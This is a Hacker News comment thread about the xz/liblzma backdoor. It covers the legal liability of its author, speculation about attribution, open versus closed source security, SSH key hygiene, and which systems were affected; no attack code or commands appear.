--- | --- | | | |  |  | [refulgentis](user?id=refulgentis) [9 months ago](item?id=39880115)   | [root](#39878188) | [parent](#39879389) | [prev](#39879637) | [next](#39880026) [–]  Law isn't code. If someone finds precedent, there will be a way to argue it doesn't cover this specific scenario. They call this conversational process "hypos" in law school, and this fundamental truth is why you never hear of a lawyer being stumped as to how to defend a client. Ultimately, the CFAA will get it done if it gets that far, armchair lawyering aside. To pressure test this fully, since this can be caricatured as "we can punish degenerate behavior as needed", which isn't necessarily great: it's also why there's a thin line between a authoritarian puppet judiciary and a fair one. | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39880026)   | [root](#39878188) | [parent](#39879389) | [prev](#39880115) | [next](#39878578) [–]  The malicious author caused the transmission of the release tarball to GitHub and the official project site. This act was intentional and as a direct result other computers were damaged (when their administrators unknowingly installed the backdoored library). You’ve got to be joking if you’re saying that this wouldn’t be an open and shut case to prosecute. It’s directly on point. Law isn’t code, any jury would have zero trouble convicting on these facts. | | --- | --- | --- | | | |  |  | [refulgentis](user?id=refulgentis) [9 months ago](item?id=39880125)   | [root](#39878188) | [parent](#39880026) | [next](#39878578) [–]  Hello fellow "law isn't code" traveller. (my least favorite engineer habit!) | | --- | --- | --- | | | |  |  | [stephc\_int13](user?id=stephc_int13) [9 months ago](item?id=39878578)   | [root](#39878188) | [parent](#39878464) | [prev](#39878962) | [next](#39878562) [–]  It is like opening the door of a safe and letting someone else rob the money inside. This is way beyond "moral level". | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39878562)   | [root](#39878188) | [parent](#39878464) | [prev](#39878578) | [next](#39878582) [–]  CFAA covers distribution of malicious software without the owners consent, the Wire Fraud Act covers malware distribution schemes intended to defraud for property, Computer Misuse act in the UK is broad and far reaching like the CFAA, so this likely fall afoul of that. The GDPR protects personal data, so there's possibly a case that could be made that this violates that as well, though that might be a bit of reach. | | --- | --- | --- | | | |  |  | [javajosh](user?id=javajosh) [9 months ago](item?id=39879355)   | [root](#39878188) | [parent](#39878562) | [next](#39878582) [–]  In which case the defense will claim, correctly, that this malware was never distributed. It was caught. "Attempted malware distribution" may not actually be a crime (but IANAL so I don't know). | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39879696)   | [root](#39878188) | [parent](#39879355) | [next](#39878582) [–]  Folks who run Debian SID or Fedora testing may disagree. | | --- | --- | --- | | | |  |  | [ndriscoll](user?id=ndriscoll) [9 months ago](item?id=39878582)   | [root](#39878188) | [parent](#39878464) | [prev](#39878562) | [next](#39880011) [–]  If more than one person was involved, it'd presumably fall under criminal conspiracy. Clearly this was an overt act in furtherance of a crime (unauthorized access under CFAA, at the least). | | --- | --- | --- | | | |  |  | [sneak](user?id=sneak) [9 months ago](item?id=39878720)   | [root](#39878188) | [parent](#39878582) | [next](#39880011) [–]  The criminal conspiracy laws don’t apply to the organizations that write this kind of code, just like murder laws don’t. | | --- | --- | --- | | | |  |  | [ceejayoz](user?id=ceejayoz) [9 months ago](item?id=39878751)   | [root](#39878188) | [parent](#39878720) | [next](#39880011) [–]  Sure they do. Getting the perpetrator into your jurisdiction is the tough part. Putin is, for example, unlikely to go anywhere willing to execute an ICC arrest warrant. | | --- | --- | --- | | | |  |  | [sneak](user?id=sneak) [9 months ago](item?id=39878791)   | [root](#39878188) | [parent](#39878751) | [next](#39880011) [–]  Nah, the CIA assassinates people in MLAT zones all the time. The laws that apply to you and I don’t apply to the privileged operators of the state’s prerogatives. We don’t even know that this specific backdoor wasn’t the NSA or CIA. Assuming it was a foreign intelligence service because the fake name was asian-sounding is a bit silly. The people who wrote this code might be sitting in Virginia or Maryland already. | | --- | --- | --- | | | |  |  | [tomoyoirl](user?id=tomoyoirl) [9 months ago](item?id=39879010)   | [root](#39878188) | [parent](#39878791) | [next](#39878932) [–]  > Virginia or Maryland Eastern Europe, suggest the timestamp / holiday analysts. [https://rheaeve.substack.com/p/xz-backdoor-times-damned-time...](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) | | --- | --- | --- | | | |  |  | [WesolyKubeczek](user?id=WesolyKubeczek) [9 months ago](item?id=39879602)   | [root](#39878188) | [parent](#39879010) | [next](#39882390) [–]  Note that while “Eastern Europe” has firm connotations with countries of which some are known for having corrupt autocracies, booming shady businesses, and organized crime and cybercrime gangs in varying proportions, the time zone mentioned also covers Finland, from which the other author is supposed to be. | | --- | --- | --- | | | |  |  | [daurentius523](user?id=daurentius523) [9 months ago](item?id=39882390)   | [root](#39878188) | [parent](#39879010) | [prev](#39879602) | [next](#39878932) [–]  Eastern Europe - 25th? Not 24th? | | --- | --- | --- | | | |  |  | [ceejayoz](user?id=ceejayoz) [9 months ago](item?id=39878932)   | [root](#39878188) | [parent](#39878791) | [prev](#39879010) | [next](#39880011) [–]  > The people who wrote this code might be sitting in Virginia or Maryland already. Sure, that’s possible. They will as a result probably avoid traveling to unfriendly jurisdictions without a diplomatic passport. | | --- | --- | --- | | | |  |  | [rl3](user?id=rl3) [9 months ago](item?id=39879371)   | [root](#39878188) | [parent](#39878932) | [next](#39880011) [–]  >*They will as a result probably avoid traveling to unfriendly jurisdictions without a diplomatic passport.* First of all, it's not like their individual identities would ever be known. Second, they would already know that traveling to a hostile country is a great way to catch bullshit espionage charges, maybe end up tortured, and certainly be used as a political pawn. Third, this is too sloppy to have originated from there anyways—however clever it was. | | --- | --- | --- | | | |  |  | [bee\_rider](user?id=bee_rider) [9 months ago](item?id=39880011)   | [root](#39878188) | [parent](#39878364) | [prev](#39878464) | [next](#39878969) [–]  Laws don’t fix technical issues any more than they fix physical ones. Clearly this was possible, so it could be done by a foreign intelligence agency or well-hidden criminal organization. I think this is probably illegal. But, I think we should not punish this sort of thing too harshly. Tech is an ecosystem. Organizations need to evolve to protect themselves. Instead, we should make companies liable for the damage that happens when they are hit by one of these attacks. Before anyone calls it out: yes, this will be blaming the victim. But, companies aren’t people, and so we don’t really need to worry about the psychological damage that victim blaming would do, in their case. They are systems, that respond to incentives, and we should provide the incentives to make them tough. | | --- | --- | --- | | | |  |  | [hnarn](user?id=hnarn) [9 months ago](item?id=39878969)   | [root](#39878188) | [parent](#39878227) | [prev](#39878364) | [next](#39878559) [–]  What is constantly overlooked here on HN is that in legal terms, one of the most important things is *intent*. Commenters on HN always approach legal issues from a technical perspective but that is simply not how the judicial system works. Whether something is “technically X” or not is irrelevant, laws are usually written with the purpose of catching people based on their intent (malicious hacking), not merely on the technicalities (pentesters distributing examples). | | --- | --- | --- | | | |  |  | [drowsspa](user?id=drowsspa) [9 months ago](item?id=39879247)   | [root](#39878188) | [parent](#39878969) | [next](#39878559) [–]  Yeah, it bothers me so much. They really seem to think that "law is code". | | --- | --- | --- | | | |  |  | [golergka](user?id=golergka) [9 months ago](item?id=39880499)   | [root](#39878188) | [parent](#39879247) | [next](#39878559) [–]  It is code, but it runs on human wetware which can decode input about actual events into output about intent, and reach consensus about this output via proper court procedures. | | --- | --- | --- | | | |  |  | [stephc\_int13](user?id=stephc_int13) [9 months ago](item?id=39878559)   | [root](#39878188) | [parent](#39878227) | [prev](#39878969) | [next](#39878406) [–]  Calling this backdoor "vulnerable code" is a gross mischaracterization. This is closer to a large scale trojan horse, that does not have to be randomly discovered by a hacker to be exploited, but is readily available for privileged remote code execution by whoever have the private key to access this backdoor. | | --- | --- | --- | | | |  |  | [ronsor](user?id=ronsor) [9 months ago](item?id=39878406)   | [root](#39878188) | [parent](#39878227) | [prev](#39878559) | [next](#39878510) [–]  It's not simply vulnerable code: it's an actual backdoor. That is malware distribution (without permission) and is therefore illegal. | | --- | --- | --- | | | |  |  | [greyface-](user?id=greyface-) [9 months ago](item?id=39878517)   | [root](#39878188) | [parent](#39878406) | [next](#39878510) [–]  Is it illegal to distribute malware? I see security researchers doing it all the time for analysis purposes. | | --- | --- | --- | | | |  |  | [ronsor](user?id=ronsor) [9 months ago](item?id=39878547)   | [root](#39878188) | [parent](#39878517) | [next](#39878576) [–]  No, it is not illegal to distribute malware by itself, but it is illegal to trick people into installing malware. The latter was the goal of the XZ contributor. | | --- | --- | --- | | | |  |  | [pbhjpbhj](user?id=pbhjpbhj) [9 months ago](item?id=39879437)   | [root](#39878188) | [parent](#39878547) | [next](#39886071) [–]  I assume you're talking from a USC perspective? Can you say which specific law, chapter, and clause applies? | | --- | --- | --- | | | |  |  | [dvhh](user?id=dvhh) [9 months ago](item?id=39886071)   | [root](#39878188) | [parent](#39878547) | [prev](#39879437) | [next](#39878576) [–]  I would somewhat agree, but then come to mind "what is the "legal" definition of malware ?". Some people would say that most drm software would act like malware/ransomware. And tricking people to install such software is only matter of an ambiguously worded checkbox. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39878576)   | [root](#39878188) | [parent](#39878517) | [prev](#39878547) | [next](#39878510) [–]  specifically, thevCFAA covers distribution of malicious software without the owners consent. Security researchs downloading malware implicitly give consent to be downloading malware marked as such. | | --- | --- | --- | | | |  |  | [M2Ys4U](user?id=M2Ys4U) [9 months ago](item?id=39878510)   | [root](#39878188) | [parent](#39878227) | [prev](#39878406) | [next](#39879584) [–]  In the UK, at least, unauthorised access to computer material under section 1 of the Computer Misuse Act 1990 - and I would also assume that it would also fall foul of sections 2 ("Unauthorised access with intent to commit or facilitate commission of further offences") and 3A ("Making, supplying or obtaining articles for use in offence under section 1, 3 or 3ZA") as well. Though proving jurisdiction would be tricky... | | --- | --- | --- | | | |  |  | [kmeisthax](user?id=kmeisthax) [9 months ago](item?id=39879584)   | [root](#39878188) | [parent](#39878227) | [prev](#39878510) | [next](#39878689) [–]  If CFAA doesn't get this guy behind bars then the CFAA is somehow even worse. Not only is it an overbroad and confusing law, it's also not broad enough to actually handcuff people who write malicious code. | | --- | --- | --- | | | |  |  | [Seattle3503](user?id=Seattle3503) [9 months ago](item?id=39878689)   | [root](#39878188) | [parent](#39878227) | [prev](#39879584) | [next](#39879487) [–]  I'd be surprised if the attacker didn't meet the criteria for mens rea. | | --- | --- | --- | | | |  |  | [martinohansen](user?id=martinohansen) [9 months ago](item?id=39879487)   | [prev](#39878188) | [next](#39877929) [–]  Imagine a future where state actors have hundreds of AI agents fixing bugs, gaining reputation while they slowly introduce backdoors. I really hope open source models succeed. | | --- | --- | --- | | | |  |  | [exitzer0](user?id=exitzer0) [9 months ago](item?id=39880248)   | [parent](#39879487) | [next](#39879546) [–]  I work for a large closed-source software company and I can tell you with 100% that it is full of domestic and foreign agents. Being open source means that more eyes can and will look at something. That only increases the chance of malicious actions being found out ... just like this supply-chain attack. | | --- | --- | --- | | | |  |  | [naruhodo](user?id=naruhodo) [9 months ago](item?id=39881038)   | [root](#39879487) | [parent](#39880248) | [next](#39879546) [–]  Reminds me of the scene in Fight Club where the unreliable narrator is discussing car defects to a fellow airline passenger. Quoting from flawed memory: Passenger: *Which company?* Narrator: *A large one.* | | --- | --- | --- | | | |  |  | [legobmw99](user?id=legobmw99) [9 months ago](item?id=39879546)   | [parent](#39879487) | [prev](#39880248) | [next](#39879543) [–]  Why would open source models make this scenario you are painting better? | | --- | --- | --- | | | |  |  | [undersuit](user?id=undersuit) [9 months ago](item?id=39879593)   | [root](#39879487) | [parent](#39879546) | [next](#39879543) [–]  Because in the closed source model the frustrated developer that looked into this SSH slowness submits a ticket for the owner of the malicious code to dismiss. | | --- | --- | --- | | | |  |  | [cqqxo4zV46cp](user?id=cqqxo4zV46cp) [9 months ago](item?id=39879853)   | [root](#39879487) | [parent](#39879593) | [next](#39879743) [–]  It’s insane to consider the actual discovery of this to be anything other than a lightning strike. What’s more interesting here is that we can say with near certainty that there are other backdoors like this out there. | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39880612)   | [root](#39879487) | [parent](#39879853) | [next](#39879743) [–]  Time to start looking at similar cases for sure. | | --- | --- | --- | | | |  |  | [legobmw99](user?id=legobmw99) [9 months ago](item?id=39879743)   | [root](#39879487) | [parent](#39879593) | [prev](#39879853) | [next](#39879953) [–]  This seems completely unrelated to the grandparent comment’s mention of open source LLMs | | --- | --- | --- | | | |  |  | [undersuit](user?id=undersuit) [9 months ago](item?id=39890078)   | [root](#39879487) | [parent](#39879743) | [next](#39879953) [–]  You're right, I read the comment as: > Imagine a future where state actors have hundreds of AI agents fixing bugs, gaining reputation while they slowly introduce backdoors. I really hope open source () succeed. I guess we can only hope verifiable and open source models can counteract the state actors. | | --- | --- | --- | | | |  |  | [matrix\_overload](user?id=matrix_overload) [9 months ago](item?id=39879953)   | [root](#39879487) | [parent](#39879593) | [prev](#39879743) | [next](#39879543) [–]  Not necessarily. A frustrated developer posts about it, it catches attention of someone who knows how to use Ghidra et al, and it gets dug out quite fast. Except, with closed-source software maintained by a for-profit company, suck cockup would mean a huge reputational hit, with billions of dollars of lost market cap. So, there are very high incentives for companies to vet their devs, have proper code reviews, etc. But with open-source, anyone can be a contributor, everyone is a friend, and nobody is reliably real-world-identifiable. So, carrying out such attacks is easier by orders magnitude. | | --- | --- | --- | | | |  |  | [yodsanklai](user?id=yodsanklai) [9 months ago](item?id=39880302)   | [root](#39879487) | [parent](#39879953) | [next](#39880607) [–]  > So, there are very high incentives for companies to vet their devs, have proper code reviews, etc. I'm not sure about that. It takes a few leetcode interviews to get in major tech companies. As for the review process, it's not always thorough (if it looks legit and the tests pass...). However, employees are identifiable and would take huge risk to be caught doing anything fishy. | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39880607)   | [root](#39879487) | [parent](#39879953) | [prev](#39880302) | [next](#39881545) [–]  Absolutely not. Getting a job at any critical infrastructure software dev company is easier than contributing to the Linux kernel. | | --- | --- | --- | | | |  |  | [OsrsNeedsf2P](user?id=OsrsNeedsf2P) [9 months ago](item?id=39881378)   | [root](#39879487) | [parent](#39880607) | [next](#39881545) [–]  Can confirm. I may work at Meta, but I was nearly banned from contributing to an open source project because my commits kept introducing bugs. | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [9 months ago](item?id=39881545)   | [root](#39879487) | [parent](#39879953) | [prev](#39880607) | [next](#39879543) [–]  We witnessed Juniper generating their VPN keys with Dual EC DRGB, and then the generator constants subverted with Juniper claiming of now knowing how did it happen. I don’t think it affected Juniper firewall business in any significant way. | | --- | --- | --- | | | |  |  | [pas](user?id=pas) [9 months ago](item?id=39879543)   | [parent](#39879487) | [prev](#39879546) | [next](#39881104) [–]  ... if we want security it needs trust anyway. it doesn't matter if it's amazing Code GPT or Chad NSA, the PR needs to be reviewed by someone we trust. it's the trust that's the problem. web of trust purists were right just ahead of the time. | | --- | --- | --- | | | |  |  | [bee\_rider](user?id=bee_rider) [9 months ago](item?id=39879911)   | [root](#39879487) | [parent](#39879543) | [next](#39880195) [–]  It would actually be sort of interesting if multiple adversarial intelligence agencies could review and sign commits. We might not trust any particular intelligence agency, but I bet the NSA and China would both be interested in not letting much through, if they knew the other guy was looking. | | --- | --- | --- | | | |  |  | [ecshafer](user?id=ecshafer) [9 months ago](item?id=39880009)   | [root](#39879487) | [parent](#39879911) | [next](#39880195) [–]  That is an interesting solution. If China, US, Russia, EU, etc all sign off and say "yep this is secure" we should trust it. Since if they think they found an exploit, they might assume the other people found an exploit. This is a little bit like the idea of a fair cut for a cake. If you have two people that want the last slice of cake, you have one cut and the other choose the first slice, since the chooser will choose the biggest slice, so the slicer knowing they will get the smaller will make it as equal as possible. In this case the NSA makes the cut (the code), and Russia / China chooses if its allowed in. | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39881509)   | [root](#39879487) | [parent](#39880009) | [next](#39880195) [–]  NSA makes the cut and China picks the public key to use. In all seriousness, those people will quickly find some middle ground and will just share keys with each other | | --- | --- | --- | | | |  |  | [bee\_rider](user?id=bee_rider) [9 months ago](item?id=39887227)   | [root](#39879487) | [parent](#39881509) | [next](#39880195) [–]  Maybe also throw EFF into the mix. | | --- | --- | --- | | | |  |  | [grepfru\_it](user?id=grepfru_it) [9 months ago](item?id=39880195)   | [root](#39879487) | [parent](#39879543) | [prev](#39879911) | [next](#39879873) [–]  this is why microsoft bought github and has been onboarding major open source projects. they will be the trusted 3rd party (whether we like it our not is a different story) | | --- | --- | --- | | | |  |  | [cqqxo4zV46cp](user?id=cqqxo4zV46cp) [9 months ago](item?id=39879873)   | [root](#39879487) | [parent](#39879543) | [prev](#39880195) | [next](#39880049) [–]  That just…doesn’t make any sense. Everyone starts from zero and works their way up. | | --- | --- | --- | | | |  |  | [pvg](user?id=pvg) [9 months ago](item?id=39880049)   | [root](#39879487) | [parent](#39879543) | [prev](#39879873) | [next](#39881104) [–]  *Chad NSA* It's called the ANS is Chad. | | --- | --- | --- | | | |  |  | [4death4](user?id=4death4) [9 months ago](item?id=39881104)   | [parent](#39879487) | [prev](#39879543) | [next](#39880229) [–]  Imagine a world where a single OSS maintainer can do the work of 100 of today’s engineers thanks to AI. In the world you describe, it seems likely that contributors would decrease as individual productivity increases. | | --- | --- | --- | | | |  |  | [sureglymop](user?id=sureglymop) [9 months ago](item?id=39881843)   | [root](#39879487) | [parent](#39881104) | [next](#39881493) [–]  Wouldn't everything produced by an AI explicitly have to be checked/reviewed by a human? If not, then the attack vector just shifts to the AI model and that's where the backdoor is placed. Sure, one may be 50 times more efficient at maintaining such packages but the problem of verifiably secure systems actually gets worse not better. | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39881493)   | [root](#39879487) | [parent](#39881104) | [prev](#39881843) | [next](#39880229) [–]  And be burned out 100x faster | | --- | --- | --- | | | |  |  | [jnwatson](user?id=jnwatson) [9 months ago](item?id=39880229)   | [parent](#39879487) | [prev](#39881104) | [next](#39881143) [–]  Presumably the state actors are looking for other state actor's bugs, and would try to fix them, or least fix them to only work for them. That's quite a game of cat and mouse. | | --- | --- | --- | | | |  |  | [starspangled](user?id=starspangled) [9 months ago](item?id=39881143)   | [parent](#39879487) | [prev](#39880229) | [next](#39877929) [–]  Why AI agents? | | --- | --- | --- | | | |  |  | [wiktor-k](user?id=wiktor-k) [9 months ago](item?id=39877929)   | [prev](#39879487) | [next](#39882268) [–]  > OpenSSH certs are weird in that they include the signer's public key. OpenSSH signatures in general contain signer's public key, which I personally think it's not weird but rather cool since it allows verifying the signature without out of the band key delivery (like in OpenPGP). The authentication of the public key is a separate subject but at least some basic checks can be done with an OpenSSH signature only. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39878919)   | [parent](#39877929) | [next](#39882268) [–]  > cool since it allows verifying the signature without out of the band key delivery hope you do key selection sanitization instead of the default (nobody does). otherwise you're accepting random keys you have laying around (like github) when logging to secret.example.com | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39879583)   | [root](#39877929) | [parent](#39878919) | [next](#39879461) [–]  Using an SSH key used with GitHub for other purposes than GitHub is not a good practice (even if it's common). <https://github.com/dolmen/github-keygen> | | --- | --- | --- | | | |  |  | [dmonitor](user?id=dmonitor) [9 months ago](item?id=39880207)   | [root](#39877929) | [parent](#39879583) | [next](#39879461) [–]  I’m confused. I make a unique private key for each machine I use. How is using that machine-specific key on multiple hosts insecure? | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39880479)   | [root](#39877929) | [parent](#39880207) | [next](#39881940) [–]  Your SSH public keys used on GitHub are very publicly exposed. This information could be used by SSH servers you are connecting to. You might think you are connecting anonymously, while in fact your SSH client is sending your public key which could then be resolved to your GitHub account. | | --- | --- | --- | | | |  |  | [jcalvinowens](user?id=jcalvinowens) [9 months ago](item?id=39886591)   | [root](#39877929) | [parent](#39880479) | [next](#39881940) [–]  I don't get it. How do you end up with shell access on a machine you don't trust to know your identity? | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39881940)   | [root](#39877929) | [parent](#39880207) | [prev](#39880479) | [next](#39879461) [–]  edit your .ssh/config. add one Host entry per domain. on the end of the file add one catch all host rule with IdentityFile /dev/null otherwise you're sending default key names to all hosts. ...and you are not sending id\_rsa.pub to every single place you add a key, like most guides suggests, right? right? | | --- | --- | --- | | | |  |  | [ykonstant](user?id=ykonstant) [9 months ago](item?id=39882465)   | [root](#39877929) | [parent](#39881940) | [next](#39879461) [–]  I would be interested in a comprehensive guide on "doing it right", or a link to a guide that suggests the right thing. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39887249)   | [root](#39877929) | [parent](#39882465) | [next](#39879461) [–]  already exists. "man sshconfig" or something. guides dumbing down things are the root of evil. | | --- | --- | --- | | | |  |  | [slooonz](user?id=slooonz) [9 months ago](item?id=39879461)   | [root](#39877929) | [parent](#39878919) | [prev](#39879583) | [next](#39882268) [–]  What do you mean ? | | --- | --- | --- | | | |  |  | [juliusdavies](user?id=juliusdavies) [9 months ago](item?id=39882268)   | [prev](#39877929) | [next](#39877763) [–]  Lucky the XZ license switched from "Public Domain" to 0BSD in February (just before these 5.6.0 and 5.6.1 releases)! 0BSD has no clauses, but it does have this: > IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. | | --- | --- | --- | | | |  |  | [perbu](user?id=perbu) [9 months ago](item?id=39882330)   | [parent](#39882268) | [next](#39883763) [–]  Gross negligence and willfull misconduct cannot be waved away like this, in certain legislations, at least. | | --- | --- | --- | | | |  |  | [juliusdavies](user?id=juliusdavies) [9 months ago](item?id=39882339)   | [root](#39882268) | [parent](#39882330) | [next](#39883763) [–]  Yes, but hopefully it does protect Lasse Collin. | | --- | --- | --- | | | |  |  | [broadsidepicnic](user?id=broadsidepicnic) [9 months ago](item?id=39882586)   | [root](#39882268) | [parent](#39882339) | [next](#39883763) [–]  From what? | | --- | --- | --- | | | |  |  | [juliusdavies](user?id=juliusdavies) [9 months ago](item?id=39882602)   | [root](#39882268) | [parent](#39882586) | [next](#39883763) [–]  Litigation including criminal prosecution | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39882940)   | [root](#39882268) | [parent](#39882602) | [next](#39884357) [–]  He had nothing to do with this, no one is going to prosecute him. | | --- | --- | --- | | | |  |  | [broadsidepicnic](user?id=broadsidepicnic) [9 months ago](item?id=39884357)   | [root](#39882268) | [parent](#39882602) | [prev](#39882940) | [next](#39883763) [–]  Uh what would be his charge? I cannot fathom how and based on what he would be charged. Maybe this is an american thing, but he's not an US citizen to start with | | --- | --- | --- | | | |  |  | [nicce](user?id=nicce) [9 months ago](item?id=39883763)   | [parent](#39882268) | [prev](#39882330) | [next](#39877763) [–]  But Public Domain license already prevented that? At least in the most countries. But local laws goes above licenses anyway. | | --- | --- | --- | | | |  |  | [emeraldd](user?id=emeraldd) [9 months ago](item?id=39877763)   | [prev](#39882268) | [next](#39879090) [–]  If I'm reading this right, would there be any persistent evidence of the executed payload? I can't think of a reason anything would have to go to disk in this situation, so a compromise could easily look like an Auth failure in the logs .... maybe a difference in timings .. but that's about it ... | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39877783)   | [parent](#39877763) | [next](#39879090) [–]  Unless the payload did something that produced evidence, or if the program using openssl that was affected was, for some reason, having all of its actions logged, then no, probably not. | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39879090)   | [prev](#39877763) | [next](#39882432) [–]  git.tukaani.org runs sshd. If that sshd was upgraded with the xz backdoor, we cannot exclude that the host was compromised as it could be have been a obvious target for the backdoor author. | | --- | --- | --- | | | |  |  | [bostik](user?id=bostik) [9 months ago](item?id=39882373)   | [parent](#39879090) | [next](#39882432) [–]  Rather unlikely. The bad actor never had access to git.tukaani.org, and the sshd version running on that host is: ```     SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u3  ``` That is, a stable Debian release. Definitely not one with liblzma5:5.6.x | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39882432)   | [prev](#39879090) | [next](#39880339) [–]  It's weird now that "it's right there in the open", Listed among the most recent commits there is "update two test files" [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89) And it's kind of smart to attack a compression library - you have plausible deniability for these opaque binary blobs - they are supposedly test cases, but in reality encode parts of the backdoor. | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39880339)   | [prev](#39882432) | [next](#39889809) [–]  God the amount of damage this would've caused, nightmarish, we are so unbelievably lucky. In a few months it would've been in every deb&rpm distribution. Thank God we found it early! | | --- | --- | --- | | | |  |  | [supposemaybe](user?id=supposemaybe) [9 months ago](item?id=39880638)   | [parent](#39880339) | [next](#39889809) [–]  Found it early?.. I found the backdoor on five of my Vultr servers as well as my MacBook Pro this evening. I certainly didn’t catch it early. So if that’s the state of it, it could very well be too late for many many companies. Not to mention folks who rely on TOR for their safety - there could be entire chains of backdoored entry, middle and exit nodes exposing vast numbers of TOR users over the past month or so (spies included!). | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39883038)   | [root](#39880339) | [parent](#39880638) | [next](#39882083) [–]  It was only in rolling release/testing/unstable distributions, a pretty small subset of systems in the grand scheme of things, is why I said that. It was introduced in February 23 release of xz. This could've been years until discovered. Never use unstable/testing on real servers, that's a bad idea for entirely different reasons. | | --- | --- | --- | | | |  |  | [echoangle](user?id=echoangle) [9 months ago](item?id=39882083)   | [root](#39880339) | [parent](#39880638) | [prev](#39883038) | [next](#39883953) [–]  Which Distro did you use on the affected devices? | | --- | --- | --- | | | |  |  | [broadsidepicnic](user?id=broadsidepicnic) [9 months ago](item?id=39883953)   | [root](#39880339) | [parent](#39880638) | [prev](#39882083) | [next](#39882434) [–]  Very few if close to zilch companies are using rolling distros in their critical infra. | | --- | --- | --- | | | |  |  | [Klonoar](user?id=Klonoar) [9 months ago](item?id=39882434)   | [root](#39880339) | [parent](#39880638) | [prev](#39883953) | [next](#39889809) [–]  ...maybe list the distros or macOS point releases/paths that you found it on macOS. ;P | | --- | --- | --- | | | |  |  | [fredoralive](user?id=fredoralive) [9 months ago](item?id=39883586)   | [root](#39880339) | [parent](#39882434) | [next](#39889809) [–]  Homebrew had updated to the backdoored version, so although it doesn’t appear to trigger on Mac OS, you should update things to ‘upgrade’ From 5.6.1 to 5.4.6. | | --- | --- | --- | | | |  |  | [christo](user?id=christo) [9 months ago](item?id=39889809)   | [prev](#39880339) | [next](#39880139) [–]  Does anyone know if a honeypot has been set up for this? In the event that exploit code has already been deployed, while these exploit attempts should now thankfully be futile, is there any valuable information that can be gained about the network sources of these exploit attempts? We might assume that since this attack was foiled, exploit attempts won't happen, but if this is an automated botnet project, there may already be other operational elements in the wild that are knocking? It's possible that there is an infection detection component to the project which is already measuring baseline accessibility, possibly using this and several alternate vectors. After all, effort was made to evade exploit attempt detection which would enable valuable active monitoring since it shouldn't trigger suspicions. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39880139)   | [prev](#39889809) | [next](#39881523) [–]  I'm surprised the attackers used Ed448 instead of Ed25519. | | --- | --- | --- | | | |  |  | [supposemaybe](user?id=supposemaybe) [9 months ago](item?id=39880661)   | [parent](#39880139) | [next](#39882303) [–]  Maybe they know something we don’t about Ed25519? [Queue X-Files theme tune] | | --- | --- | --- | | | |  |  | [t0mas88](user?id=t0mas88) [9 months ago](item?id=39882303)   | [parent](#39880139) | [prev](#39880661) | [next](#39881523) [–]  Maybe their organisation has a policy that requires stronger encryption? Possibly because that organisation is also in the business of cracking such encryption... | | --- | --- | --- | | | |  |  | [hosteur](user?id=hosteur) [9 months ago](item?id=39882759)   | [root](#39880139) | [parent](#39882303) | [next](#39881523) [–]  Is Ed448 stronger than Ed25519? | | --- | --- | --- | | | |  |  | [d-z-m](user?id=d-z-m) [9 months ago](item?id=39885810)   | [root](#39880139) | [parent](#39882759) | [next](#39881523) [–]  Quantitatively, yes(2^224 security target vs 2^128 security target respectively wrt. discrete log calculation). Qualitatively, 2^128 is already computationally infeasible(barring some advance in quantum computing), so the meaningful difference in security is debatable, assuming no weaknesses in the underlying curve. | | --- | --- | --- | | | |  |  | [bandrami](user?id=bandrami) [9 months ago](item?id=39881523)   | [prev](#39880139) | [next](#39879349) [–]  This was so bizarre I had to check twice that it isn't actually April 1 (I'm in Asia so I get a lot of off-by-one-day stories from the US) | | --- | --- | --- | | | |  |  | [justinsaccount](user?id=justinsaccount) [9 months ago](item?id=39879349)   | [prev](#39881523) | [next](#39878714) [–]  > Apparently the backdoor reverts back to regular operation if the payload is malformed or the signature from the attacker's key doesn't verify. Does this mean it's possible to send every ssh server on the internet a malformed payload to get it to disable the backdoor if it was vulnerable? | | --- | --- | --- | | | |  |  | [denysvitali](user?id=denysvitali) [9 months ago](item?id=39879959)   | [parent](#39879349) | [next](#39878714) [–]  It just reverts it for the specific connection - most likely to not raise suspicions on the fact that SSH doesn't accept RSA keys anymore | | --- | --- | --- | | | |  |  | [paolomainardi](user?id=paolomainardi) [9 months ago](item?id=39878714)   | [prev](#39879349) | [next](#39877673) [–]  I am wondering if reinstalling the entire Archlinux installation would be a wise choice. | | --- | --- | --- | | | |  |  